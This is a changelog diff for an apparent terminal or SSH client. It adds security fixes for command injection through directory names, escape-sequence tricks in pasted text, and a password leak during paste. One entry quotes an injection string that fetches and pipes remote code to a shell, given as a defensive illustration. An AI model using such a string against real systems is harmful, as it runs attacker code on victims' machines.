@@ -4,6 +4,14 @@ All notable changes to this project are documented in this file.
 
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/).
 
+## [Unreleased]
+
+### Security
+
+- **Clicking a breadcrumb segment can no longer run a command hidden in a directory name.** The `cd` it inserts was built from the path as-is, so a directory called `x;curl evil|sh;` — or a forged path printed by a file you `cat` — became part of the command line and ran on Enter. The path is now inserted as a single quoted argument, and control characters are stripped from the path, user and host the server reports.
+- **Pasted or inserted text can no longer show one command and send another.** Text arriving from the clipboard, the catalog, history, snippets or the breadcrumb was echoed and buffered raw, so escape sequences inside it could move the cursor and erase part of the line on screen while the full text was still sent on Enter. Control characters (everything but Tab) are now removed from inserted text, and typed or natively pasted input additionally drops the C1 range it used to let through.
+- **"Paste" in the terminal context menu no longer reveals a password during an SSH password or passphrase prompt.** That one route bypassed the masking that `Ctrl+V` and right-click paste already had: the secret was printed in clear text after `Password:` and never reached the prompt. Every paste route now makes that decision in one place.
+
 ## [1.0.2] — 2026-09-13
 
 ### Changed
